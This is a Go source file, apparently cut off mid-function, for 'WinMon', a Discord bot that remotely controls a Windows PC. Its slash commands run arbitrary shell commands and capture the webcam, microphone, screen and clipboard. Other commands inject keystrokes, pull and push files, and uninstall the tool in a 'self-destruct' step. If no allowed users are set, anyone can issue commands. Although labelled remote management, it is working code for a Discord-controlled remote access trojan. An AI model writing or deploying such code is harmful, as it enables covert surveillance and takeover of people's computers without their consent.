package bot

import (
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/bwmarrin/discordgo"

	"winmon/internal/audio"
	"winmon/internal/clipboard"
	"winmon/internal/config"
	"winmon/internal/device"
	"winmon/internal/display"
	"winmon/internal/files"
	"winmon/internal/input"
	"winmon/internal/media"
	"winmon/internal/notifications"
	"winmon/internal/service"
	"winmon/internal/shell"
)

type BotCoordinator struct {
	cfg      *config.Config
	session  *discordgo.Session
	stopChan chan struct{}
}

func NewBotCoordinator(cfg *config.Config, stopChan chan struct{}) *BotCoordinator {
	return &BotCoordinator{
		cfg:      cfg,
		stopChan: stopChan,
	}
}

func (b *BotCoordinator) Start() {
	dg, err := discordgo.New("Bot " + b.cfg.BotToken)
	if err != nil {
		log.Fatalf("Failed to create Discord session: %v", err)
	}
	b.session = dg

	dg.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMessages | discordgo.IntentsDirectMessages | discordgo.IntentsMessageContent

	dg.AddHandler(b.handleInteraction)
	dg.AddHandler(b.handleMessageCreate)

	err = dg.Open()
	if err != nil {
		log.Fatalf("Failed to open Discord websocket connection: %v", err)
	}
	defer dg.Close()

	log.Printf("🟢 WinMon Discord Bot connected successfully as %s#%s (Device: %s)",
		dg.State.User.Username, dg.State.User.Discriminator, b.cfg.DeviceName)

	// Register Slash Commands
	b.registerSlashCommands()

	<-b.stopChan
	log.Println("Stopping WinMon Discord Bot...")
}

func (b *BotCoordinator) isAuthorized(userID string) bool {
	if len(b.cfg.AllowedUsers) == 0 {
		return true
	}
	for _, id := range b.cfg.AllowedUsers {
		if strings.TrimSpace(id) == userID {
			return true
		}
	}
	return false
}

func (b *BotCoordinator) registerSlashCommands() {
	commands := []*discordgo.ApplicationCommand{
		{
			Name:        "help",
			Description: "Display WinMon Control Panel & Available Commands",
		},
		{
			Name:        "deviceinfo",
			Description: "Display system metrics and hardware info",
		},
		{
			Name:        "screenshot",
			Description: "Capture primary display screenshot",
		},
		{
			Name:        "webcam",
			Description: "Capture photo from active webcam",
		},
		{
			Name:        "screenrecord",
			Description: "Record screen activity as GIF",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "duration",
					Description: "Duration in seconds (default: 5)",
					Required:    false,
				},
			},
		},
		{
			Name:        "listen",
			Description: "Record microphone audio",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "duration",
					Description: "Duration in seconds (default: 5)",
					Required:    false,
				},
			},
		},
		{
			Name:        "cmd",
			Description: "Execute shell command",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "command",
					Description: "Shell command to execute",
					Required:    true,
				},
			},
		},
		{
			Name:        "processes",
			Description: "List running processes",
		},
		{
			Name:        "kill",
			Description: "Kill process by PID or name",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "target",
					Description: "Process PID or process name (e.g. 1234 or notepad.exe)",
					Required:    true,
				},
			},
		},
		{
			Name:        "download",
			Description: "Download file from PC",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "filepath",
					Description: "Full local file path on PC",
					Required:    true,
				},
			},
		},
		{
			Name:        "upload",
			Description: "Upload file to PC",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionAttachment,
					Name:        "file",
					Description: "File to upload",
					Required:    true,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "destination",
					Description: "Destination folder or file path",
					Required:    false,
				},
			},
		},
		{
			Name:        "tts",
			Description: "Speak text aloud on PC speakers",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "text",
					Description: "Text message to speak",
					Required:    true,
				},
			},
		},
		{
			Name:        "playsound",
			Description: "Play audio file on PC",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionAttachment,
					Name:        "file",
					Description: "Audio file to play",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "path",
					Description: "Local audio file path on PC",
					Required:    false,
				},
			},
		},
		{
			Name:        "wallpaper",
			Description: "Get current desktop wallpaper image",
		},
		{
			Name:        "setwallpaper",
			Description: "Set desktop wallpaper image",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionAttachment,
					Name:        "file",
					Description: "Wallpaper image file",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "path",
					Description: "Local image path on PC",
					Required:    false,
				},
			},
		},
		{
			Name:        "notify",
			Description: "Display desktop notification toast",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "message",
					Description: "Notification message",
					Required:    true,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "title",
					Description: "Notification title",
					Required:    false,
				},
			},
		},
		{
			Name:        "type",
			Description: "Type text into active window",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "text",
					Description: "Text to type",
					Required:    true,
				},
			},
		},
		{
			Name:        "keypress",
			Description: "Press keyboard key",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "key",
					Description: "Key name (e.g. enter, esc, space, tab, backspace)",
					Required:    true,
				},
			},
		},
		{
			Name:        "hotkey",
			Description: "Trigger keyboard hotkey combo",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "combo",
					Description: "Hotkey combo (e.g. ctrl+alt+del, win+d, alt+f4)",
					Required:    true,
				},
			},
		},
		{
			Name:        "mouse",
			Description: "Simulate mouse actions",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "action",
					Description: "Mouse action (click, rightclick, doubleclick, move, scroll)",
					Required:    true,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{Name: "Click", Value: "click"},
						{Name: "Right Click", Value: "rightclick"},
						{Name: "Double Click", Value: "doubleclick"},
						{Name: "Move", Value: "move"},
						{Name: "Scroll", Value: "scroll"},
					},
				},
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "x",
					Description: "X coordinate (for move)",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "y",
					Description: "Y coordinate or scroll amount",
					Required:    false,
				},
			},
		},
		{
			Name:        "clipboard",
			Description: "Get desktop clipboard content",
		},
		{
			Name:        "setclipboard",
			Description: "Set clipboard content",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "text",
					Description: "Text to copy to clipboard",
					Required:    true,
				},
			},
		},
		{
			Name:        "brightness",
			Description: "Adjust display brightness",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "level",
					Description: "Brightness level (0-100)",
					Required:    true,
				},
			},
		},
		{
			Name:        "setvol",
			Description: "Set system audio volume",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "level",
					Description: "Volume level (0-100)",
					Required:    true,
				},
			},
		},
		{
			Name:        "mute",
			Description: "Mute system audio",
		},
		{
			Name:        "unmute",
			Description: "Unmute system audio",
		},
		{
			Name:        "shutdown",
			Description: "Initiate system shutdown",
		},
		{
			Name:        "restart",
			Description: "Initiate system restart",
		},
		{
			Name:        "shutdownservice",
			Description: "Stop WinMon service",
		},
		{
			Name:        "restartservice",
			Description: "Restart WinMon service",
		},
		{
			Name:        "implode",
			Description: "Uninstall WinMon service and terminate",
		},
	}

	appID := b.session.State.User.ID
	for _, cmd := range commands {
		_, err := b.session.ApplicationCommandCreate(appID, b.cfg.GuildID, cmd)
		if err != nil {
			log.Printf("Warning: Failed to register slash command /%s: %v", cmd.Name, err)
		}
	}
}

func (b *BotCoordinator) handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
	userID := ""
	if i.Member != nil && i.Member.User != nil {
		userID = i.Member.User.ID
	} else if i.User != nil {
		userID = i.User.ID
	}

	if !b.isAuthorized(userID) {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "⛔ **Access Denied:** Your Discord user ID is not authorized to control WinMon.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}

	// Defer response to avoid 3-second Discord interaction timeout
	err := s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseDeferredChannelMessageWithSource,
	})
	if err != nil {
		log.Printf("Error deferring interaction: %v", err)
		return
	}

	switch i.Type {
	case discordgo.InteractionApplicationCommand:
		data := i.ApplicationCommandData()
		b.dispatchSlashCommand(s, i, data)
	case discordgo.InteractionMessageComponent:
		data := i.MessageComponentData()
		b.dispatchButtonComponent(s, i, data.CustomID)
	}
}

func (b *BotCoordinator) handleMessageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}
	if !b.isAuthorized(m.Author.ID) {
		return
	}

	// Handle direct message file attachments if any
	if len(m.Attachments) > 0 && strings.HasPrefix(m.Content, "/upload") {
		att := m.Attachments[0]
		dest := strings.TrimSpace(strings.TrimPrefix(m.Content, "/upload"))
		b.handleAttachmentUpload(s, m.ChannelID, att, dest)
	}
}

func (b *BotCoordinator) dispatchSlashCommand(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	cmd := "/" + data.Name
	optionsMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
	for _, opt := range data.Options {
		optionsMap[opt.Name] = opt
	}

	switch data.Name {
	case "help":
		b.sendHelpPanel(s, i)
	case "deviceinfo":
		info, err := device.GetDeviceInfo(b.cfg.DeviceName, b.cfg.DeviceID, b.cfg.Version)
		if err != nil {
			b.sendError(s, i, err)
			return
		}
		embed := &discordgo.MessageEmbed{
			Title:       "🖥️ WinMon Device Information",
			Color:       0x00FF88,
			Description: fmt.Sprintf("```\n%s\n```", info),
			Timestamp:   time.Now().Format(time.RFC3339),
		}
		b.sendEmbedWithButtons(s, i, embed)
	case "screenshot":
		b.executeCommandLocally(cmd, nil, s, i)
	case "webcam":
		b.executeCommandLocally(cmd, nil, s, i)
	case "screenrecord":
		dur := "5"
		if opt, ok := optionsMap["duration"]; ok {
			dur = strconv.FormatInt(opt.IntValue(), 10)
		}
		b.executeCommandLocally(cmd, []string{dur}, s, i)
	case "listen":
		dur := "5"
		if opt, ok := optionsMap["duration"]; ok {
			dur = strconv.FormatInt(opt.IntValue(), 10)
		}
		b.executeCommandLocally(cmd, []string{dur}, s, i)
	case "cmd":
		shellCmd := optionsMap["command"].StringValue()
		b.executeCommandLocally(cmd, []string{shellCmd}, s, i)
	case "processes":
		b.executeCommandLocally(cmd, nil, s, i)
	case "kill":
		target := optionsMap["target"].StringValue()
		b.executeCommandLocally(cmd, []string{target}, s, i)
	case "download":
		filePath := optionsMap["filepath"].StringValue()
		b.executeCommandLocally(cmd, []string{filePath}, s, i)
	case "upload":
		attID := optionsMap["file"].Value.(string)
		att := data.Resolved.Attachments[attID]
		dest := ""
		if opt, ok := optionsMap["destination"]; ok {
			dest = opt.StringValue()
		}
		b.handleAttachmentUploadInteraction(s, i, att, dest)
	case "tts":
		text := optionsMap["text"].StringValue()
		b.executeCommandLocally(cmd, []string{text}, s, i)
	case "playsound":
		if opt, ok := optionsMap["file"]; ok {
			attID := opt.Value.(string)
			att := data.Resolved.Attachments[attID]
			b.handlePlaySoundAttachment(s, i, att)
		} else if opt, ok := optionsMap["path"]; ok {
			b.executeCommandLocally(cmd, []string{opt.StringValue()}, s, i)
		} else {
			b.sendText(s, i, "Please provide either a `file` attachment or a `path` parameter.")
		}
	case "wallpaper":
		b.executeCommandLocally(cmd, nil, s, i)
	case "setwallpaper":
		if opt, ok := optionsMap["file"]; ok {
			attID := opt.Value.(string)
			att := data.Resolved.Attachments[attID]
			b.handleSetWallpaperAttachment(s, i, att)
		} else if opt, ok := optionsMap["path"]; ok {
			b.executeCommandLocally(cmd, []string{opt.StringValue()}, s, i)
		} else {
			b.sendText(s, i, "Please provide either a `file` attachment or a `path` parameter.")
		}
	case "notify":
		msg := optionsMap["message"].StringValue()
		title := "WinMon Notification"
		if opt, ok := optionsMap["title"]; ok {
			title = opt.StringValue()
		}
		b.executeCommandLocally(cmd, []string{title + "|" + msg}, s, i)
	case "type":
		text := optionsMap["text"].StringValue()
		b.executeCommandLocally(cmd, []string{text}, s, i)
	case "keypress":
		key := optionsMap["key"].StringValue()
		b.executeCommandLocally(cmd, []string{key}, s, i)
	case "hotkey":
		combo := optionsMap["combo"].StringValue()
		b.executeCommandLocally(cmd, []string{combo}, s, i)
	case "mouse":
		action := optionsMap["action"].StringValue()
		args := []string{action}
		if opt, ok := optionsMap["x"]; ok {
			args = append(args, strconv.FormatInt(opt.IntValue(), 10))
		}
		if opt, ok := optionsMap["y"]; ok {
			args = append(args, strconv.FormatInt(opt.IntValue(), 10))
		}
		b.executeCommandLocally(cmd, args, s, i)
	case "clipboard":
		b.executeCommandLocally(cmd, nil, s, i)
	case "setclipboard":
		text := optionsMap["text"].StringValue()
		b.executeCommandLocally(cmd, []string{text}, s, i)
	case "brightness":
		level := strconv.FormatInt(optionsMap["level"].IntValue(), 10)
		b.executeCommandLocally(cmd, []string{level}, s, i)
	case "setvol":
		level := strconv.FormatInt(optionsMap["level"].IntValue(), 10)
		b.executeCommandLocally(cmd, []string{level}, s, i)
	case "mute":
		b.executeCommandLocally(cmd, nil, s, i)
	case "unmute":
		b.executeCommandLocally(cmd, nil, s, i)
	case "shutdown":
		b.executeCommandLocally(cmd, nil, s, i)
	case "restart":
		b.executeCommandLocally(cmd, nil, s, i)
	case "shutdownservice":
		b.executeCommandLocally(cmd, nil, s, i)
	case "restartservice":
		b.executeCommandLocally(cmd, nil, s, i)
	case "implode":
		b.executeCommandLocally(cmd, nil, s, i)
	}
}

func (b *BotCoordinator) dispatchButtonComponent(s *discordgo.Session, i *discordgo.InteractionCreate, customID string) {
	switch customID {
	case "btn_screenshot":
		b.executeCommandLocally("/screenshot", nil, s, i)
	case "btn_processes":
		b.executeCommandLocally("/processes", nil, s, i)
	case "btn_deviceinfo":
		info, err := device.GetDeviceInfo(b.cfg.DeviceName, b.cfg.DeviceID, b.cfg.Version)
		if err != nil {
			b.sendError(s, i, err)
			return
		}
		embed := &discordgo.MessageEmbed{
			Title:       "🖥️ WinMon Device Information",
			Color:       0x00FF88,
			Description: fmt.Sprintf("```\n%s\n```", info),
		}
		b.sendEmbedWithButtons(s, i, embed)
	case "btn_clipboard":
		b.executeCommandLocally("/clipboard", nil, s, i)
	case "btn_mute":
		b.executeCommandLocally("/mute", nil, s, i)
	}
}

func (b *BotCoordinator) sendHelpPanel(s *discordgo.Session, i *discordgo.InteractionCreate) {
	embed := &discordgo.MessageEmbed{
		Title:       "⚡ WinMon Control Panel",
		Description: fmt.Sprintf("**Connected Endpoint:** `%s` (UUID: `%s`)\n**Status:** 🟢 Online & Managed", b.cfg.DeviceName, b.cfg.DeviceID),
		Color:       0x5865F2, // Discord Blurple
		Fields: []*discordgo.MessageEmbedField{
			{
				Name:   "📸 Capture & Media",
				Value:  "`/screenshot`, `/webcam`, `/screenrecord [dur]`, `/listen [dur]`, `/wallpaper`",
				Inline: false,
			},
			{
				Name:   "💻 System & Diagnostics",
				Value:  "`/deviceinfo`, `/processes`, `/kill <target>`, `/cmd <command>`",
				Inline: false,
			},
			{
				Name:   "🔊 Audio & Display Controls",
				Value:  "`/setvol <0-100>`, `/mute`, `/unmute`, `/tts <text>`, `/brightness <0-100>`",
				Inline: false,
			},
			{
				Name:   "⌨️ Remote Input & Control",
				Value:  "`/type <text>`, `/keypress <key>`, `/hotkey <combo>`, `/mouse <action>`, `/clipboard`",
				Inline: false,
			},
			{
				Name:   "📁 Files & Utilities",
				Value:  "`/download <filepath>`, `/upload <file> [dest]`, `/notify <msg>`",
				Inline: false,
			},
		},
		Footer: &discordgo.MessageEmbedFooter{
			Text: "WinMon Remote PC Management • Powered by Discord",
		},
		Timestamp: time.Now().Format(time.RFC3339),
	}

	b.sendEmbedWithButtons(s, i, embed)
}

func (b *BotCoordinator) sendEmbedWithButtons(s *discordgo.Session, i *discordgo.InteractionCreate, embed *discordgo.MessageEmbed) {
	components := []discordgo.MessageComponent{
		discordgo.ActionsRow{
			Components: []discordgo.MessageComponent{
				discordgo.Button{
					Label:    "Screenshot",
					Style:    discordgo.PrimaryButton,
					CustomID: "btn_screenshot",
					Emoji:    &discordgo.ComponentEmoji{Name: "📸"},
				},
				discordgo.Button{
					Label:    "Processes",
					Style:    discordgo.SecondaryButton,
					CustomID: "btn_processes",
					Emoji:    &discordgo.ComponentEmoji{Name: "📋"},
				},
				discordgo.Button{
					Label:    "Device Info",
					Style:    discordgo.SecondaryButton,
					CustomID: "btn_deviceinfo",
					Emoji:    &discordgo.ComponentEmoji{Name: "🖥️"},
				},
				discordgo.Button{
					Label:    "Clipboard",
					Style:    discordgo.SecondaryButton,
					CustomID: "btn_clipboard",
					Emoji:    &discordgo.ComponentEmoji{Name: "📋"},
				},
				discordgo.Button{
					Label:    "Mute",
					Style:    discordgo.DangerButton,
					CustomID: "btn_mute",
					Emoji:    &discordgo.ComponentEmoji{Name: "🔇"},
				},
			},
		},
	}

	s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
		Embeds:     []*discordgo.MessageEmbed{embed},
		Components: components,
	})
}

func (b *BotCoordinator) sendText(s *discordgo.Session, i *discordgo.InteractionCreate, content string) {
	s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
		Content: content,
	})
}

func (b *BotCoordinator) sendError(s *discordgo.Session, i *discordgo.InteractionCreate, err error) {
	s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
		Content: fmt.Sprintf("🔴 **Execution Error:** %v", err),
	})
}

func (b *BotCoordinator) sendFile(s *discordgo.Session, i *discordgo.InteractionCreate, filePath string, caption string) {
	file, err := os.Open(filePath)
	if err != nil {
		b.sendError(s, i, err)
		return
	}
	defer file.Close()

	s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
		Content: caption,
		Files: []*discordgo.File{
			{
				Name:        filepath.Base(filePath),
				ContentType: "application/octet-stream",
				Reader:      file,
			},
		},
	})
}

func (b *BotCoordinator) executeCommandLocally(cmd string, args []string, s *discordgo.Session, i *discordgo.InteractionCreate) {
	start := time.Now()

	// Check interactive status
	isInteractive := false
	interactiveCmds := map[string]bool{
		"/screenshot":   true,
		"/webcam":       true,
		"/screenrecord": true,
		"/listen":       true,
		"/tts":          true,
		"/playsound":    true,
		"/setwallpaper": true,
		"/wallpaper":    true,
		"/notify":       true,
		"/type":         true,
		"/keypress":     true,
		"/hotkey":       true,
		"/mouse":        true,
		"/clipboard":    true,
		"/setclipboard": true,
		"/brightness":   true,
	}

	if _, ok := interactiveCmds[cmd]; ok {
		isInteractive = true
	}

	if isInteractive && service.IsRunningAsService() {
		flatArgs := strings.Join(args, " ")
		resp, err := service.SendIPCCommand(service.IPCRequest{
			Cmd:      cmd,
			Args:     args,
			FlatArgs: flatArgs,
		}, 60*time.Second)

		if err != nil {
			b.sendError(s, i, fmt.Errorf("Session Agent IPC Error: %w", err))
			return
		}
		if !resp.Success {
			b.sendError(s, i, errors.New(resp.Error))
			return
		}

		b.handleHelperOutputDiscord(cmd, s, i, start)
		return
	}

	// Native execution
	b.executeNativeDiscord(cmd, args, s, i, start)
}

func (b *BotCoordinator) executeNativeDiscord(cmd string, args []string, s *discordgo.Session, i *discordgo.InteractionCreate, start time.Time) {
	switch cmd {
	case "/deviceinfo":
		info, err := device.GetDeviceInfo(b.cfg.DeviceName, b.cfg.DeviceID, b.cfg.Version)
		if err != nil {
			b.sendError(s, i, err)
			return
		}
		embed := &discordgo.MessageEmbed{
			Title:       "🖥️ WinMon Device Info",
			Color:       0x00FF88,
			Description: fmt.Sprintf("```\n%s\n```", info),
		}
		b.sendEmbedWithButtons(s, i, embed)
	case "/processes":
		procs, err := shell.ExecuteCommand("tasklist", 10*time.Second)
		if err != nil {
			b.sendError(s, i, err)
			return
		}
		if len(procs) > 1950 {
			procs = procs[:1950] + "\n... [truncated]"
		}
		b.sendText(s, i, fmt.Sprintf("📋 **Running Processes:**\n```\n%s\n```", procs))
	case "/kill":
		if len(args) < 1 {
			b.sendText(s, i, "Usage: `/kill <PID or ProcessName>`")
			return
		}
		killCmd := fmt.Sprintf("taskkill /F /PID %s || taskkill /F /IM %s", args[0], args[0])
		out, err := shell.ExecuteCommand(killCmd, 10*time.Second)
		if err != nil {
			b.sendError(s, i, fmt.Errorf("%s (%v)", out, err))
		} else {
			b.sendText(s, i, fmt.Sprintf("🟢 Process `%s` terminated successfully:\n```\n%s\n```", args[0], out))
		}
	case "/cmd":
		if len(args) < 1 {
			b.sendText(s, i, "Usage: `/cmd <command>`")
			return
		}
		out, err := shell.ExecuteCommand(args[0], 20*time.Second)
		if len(out) > 1900 {
			out = out[:1900] + "\n... [truncated]"
		}
		if err != nil {
			b.sendText(s, i, fmt.Sprintf("🔴 **Command Execution Failed:**\n```\n%s\nError: %v\n```", out, err))
		} else {
			b.sendText(s, i, fmt.Sprintf("🟢 **Command Output:**\n```\n%s\n```", out))
		}
	case "/download":
		if len(args) < 1 {
			b.sendText(s, i, "Usage: `/download <filepath>`")
			return
		}
		path := args[0]
		b.sendFile(s, i, path, fmt.Sprintf("📥 File download from `%s`:", b.cfg.DeviceName))
	case "/setvol":
		if len(args) < 1 {
			b.sendText(s, i, "Usage: `/setvol <0-100>`")
			return
		}
		vol, err := strconv.Atoi(args[0])
		if err != nil {
			b.sendText(s, i, "Volume must be an integer (0-100).")
			return
		}
		err = audio.SetVolume(vol)
		if err != nil {
			b.sendError(s, i, err)
		} else {
			b.sendText(s, i, fmt.Sprintf("🔊 Volume set to **%d%%**.", vol))
		}
	case "/mute":
		err := audio.SetMute(true)
		if err != nil {
			b.sendError(s, i, err)
		} else {
			b.sendText(s, i, "🔇 Audio muted.")
		}
	case "/unmute":
		err := audio.SetMute(false)
		if err != nil {
			b.sendError(s, i, err)
		} else {
			b.sendText(s, i, "🔊 Audio unmuted.")
		}
	case "/shutdown":
		b.sendText(s, i, "⚠️ Initiating target PC shutdown in 5 seconds...")
		_, _ = shell.ExecuteCommand("shutdown /s /t 5 /c \"WinMon Remote Shutdown\"", 5*time.Second)
	case "/restart":
		b.sendText(s, i, "⚠️ Initiating target PC restart in 5 seconds...")
		_, _ = shell.ExecuteCommand("shutdown /r /t 5 /c \"WinMon Remote Restart\"", 5*time.Second)
	case "/shutdownservice":
		b.sendText(s, i, "🛑 Stopping WinMon service/process...")
		if service.IsRunningAsService() {
			_ = service.StopService("WinMon")
		} else {
			go func() {
				time.Sleep(1 * time.Second)
				os.Exit(0)
			}()
		}
	case "/restartservice":
		b.sendText(s, i, "🔄 Restarting WinMon service...")
		if service.IsRunningAsService() {
			_ = service.StartService("WinMon")
		}
	case "/implode":
		b.sendText(s, i, "💥 Uninstalling WinMon service and self-destructing...")
		if service.IsRunningAsService() {
			_ = service.UninstallService("WinMon")
		}
		go func() {
			time.Sleep(2 * time.Second)
			os.Exit(0)
		}()
	default:
		// Fallback for native execution of interactive commands when running in console mode
		err := RunSessionHelper(cmd, strings.Join(args, " "))
		if err != nil {
			b.sendError(s, i, err)
			return
		}
		b.handleHelperOutputDiscord(cmd, s, i, start)
	}
}

func (b *BotCoordinator) handleHelperOutputDiscord(cmd string, s *discordgo.Session, i *discordgo.InteractionCreate, start time.Time) {
	dur := fmt.Sprintf("(%d ms)", time.Since(start).Milliseconds())

	switch cmd {
	case "/screenshot":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_screenshot.jpg")
		if _, err := os.Stat(tempPath); err == nil {
			b.sendFile(s, i, tempPath, "📸 **Desktop Screenshot** "+dur)
			os.Remove(tempPath)
		} else {
			b.sendText(s, i, "Failed to retrieve screenshot from session agent.")
		}
	case "/webcam":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_webcam.jpg")
		if _, err := os.Stat(tempPath); err == nil {
			b.sendFile(s, i, tempPath, "📷 **Webcam Photo** "+dur)
			os.Remove(tempPath)
		} else {
			b.sendText(s, i, "Failed to retrieve webcam capture from session agent.")
		}
	case "/screenrecord":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_record.gif")
		if _, err := os.Stat(tempPath); err == nil {
			b.sendFile(s, i, tempPath, "🎥 **Screen Recording GIF** "+dur)
			os.Remove(tempPath)
		} else {
			b.sendText(s, i, "Failed to retrieve screen recording from session agent.")
		}
	case "/listen":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_audio.wav")
		if _, err := os.Stat(tempPath); err == nil {
			b.sendFile(s, i, tempPath, "🎙️ **Microphone Audio Recording** "+dur)
			os.Remove(tempPath)
		} else {
			b.sendText(s, i, "Failed to retrieve audio recording from session agent.")
		}
	case "/clipboard":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_clipboard.txt")
		if data, err := os.ReadFile(tempPath); err == nil {
			b.sendText(s, i, fmt.Sprintf("📋 **Clipboard Content:**\n```\n%s\n```", string(data)))
			os.Remove(tempPath)
		} else {
			b.sendText(s, i, "Failed to read clipboard from session agent.")
		}
	case "/wallpaper":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_wallpaper.jpg")
		if _, err := os.Stat(tempPath); err == nil {
			b.sendFile(s, i, tempPath, "🖼️ **Desktop Wallpaper** "+dur)
			os.Remove(tempPath)
		} else {
			b.sendText(s, i, "Failed to capture wallpaper from session agent.")
		}
	case "/brightness":
		b.sendText(s, i, "🔆 Display brightness adjusted successfully.")
	default:
		b.sendText(s, i, fmt.Sprintf("🟢 Command `%s` executed successfully %s.", cmd, dur))
	}
}

func (b *BotCoordinator) handleAttachmentUploadInteraction(s *discordgo.Session, i *discordgo.InteractionCreate, att *discordgo.MessageAttachment, destination string) {
	b.downloadAndSaveAttachment(s, i, att.URL, att.Filename, destination)
}

func (b *BotCoordinator) handleAttachmentUpload(s *discordgo.Session, channelID string, att *discordgo.MessageAttachment, destination string) {
	// Direct message fallback
	finalPath, err := files.PrepareUploadPath(destination, att.Filename)
	if err != nil {
		s.ChannelMessageSend(channelID, fmt.Sprintf("🔴 Invalid destination path: %v", err))
		return
	}

	resp, err := http.Get(att.URL)
	if err != nil {
		s.ChannelMessageSend(channelID, fmt.Sprintf("🔴 Failed to download attachment: %v", err))
		return
	}
	defer resp.Body.Close()

	out, err := os.Create(finalPath)
	if err != nil {
		s.ChannelMessageSend(channelID, fmt.Sprintf("🔴 Failed to create file: %v", err))
		return
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		s.ChannelMessageSend(channelID, fmt.Sprintf("🔴 Failed to save file: %v", err))
		return
	}

	s.ChannelMessageSend(channelID, fmt.Sprintf("🟢 File uploaded successfully to `%s`", finalPath))
}

func (b *BotCoordinator) downloadAndSaveAttachment(s *discordgo.Session, i *discordgo.InteractionCreate, url string, filename string, destination string) {
	finalPath, err := files.PrepareUploadPath(destination, filename)
	if err != nil {
		b.sendError(s, i, err)
		return
	}

	resp, err := http.Get(url)
	if err != nil {
		b.sendError(s, i, fmt.Errorf("failed to download attachment: %w", err))
		return
	}
	defer resp.Body.Close()

	out, err := os.Create(finalPath)
	if err != nil {
		b.sendError(s, i, fmt.Errorf("failed to create local file: %w", err))
		return
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		b.sendError(s, i, fmt.Errorf("failed to write local file: %w", err))
		return
	}

	b.sendText(s, i, fmt.Sprintf("🟢 File uploaded successfully to `%s`", finalPath))
}

func (b *BotCoordinator) handlePlaySoundAttachment(s *discordgo.Session, i *discordgo.InteractionCreate, att *discordgo.MessageAttachment) {
	tempPath := filepath.Join(service.GetSharedTempDir(), "winmon_play_"+att.Filename)
	b.downloadAndSaveAttachment(s, i, att.URL, att.Filename, tempPath)
	b.executeCommandLocally("/playsound", []string{tempPath}, s, i)
	os.Remove(tempPath)
}

func (b *BotCoordinator) handleSetWallpaperAttachment(s *discordgo.Session, i *discordgo.InteractionCreate, att *discordgo.MessageAttachment) {
	tempPath := filepath.Join(service.GetSharedTempDir(), "winmon_wall_"+att.Filename)
	b.downloadAndSaveAttachment(s, i, att.URL, att.Filename, tempPath)
	b.executeCommandLocally("/setwallpaper", []string{tempPath}, s, i)
	os.Remove(tempPath)
}

// Session helper commands (executed inside user desktop session)
func RunSessionHelper(cmd string, args string) error {
	switch cmd {
	case "/screenshot":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_screenshot.jpg")
		return media.CaptureScreen(tempPath)
	case "/webcam":
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_webcam.jpg")
		return media.CaptureWebcam(tempPath)
	case "/screenrecord":
		dur := parseDuration(args)
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_record.gif")
		return media.RecordScreen(dur, tempPath)
	case "/listen":
		dur := parseDuration(args)
		tempPath := filepath.Join(service.GetSharedTempDir(), "helper_audio.wav")
		return media.RecordAudio(dur, tempPath)
	case "/tts":
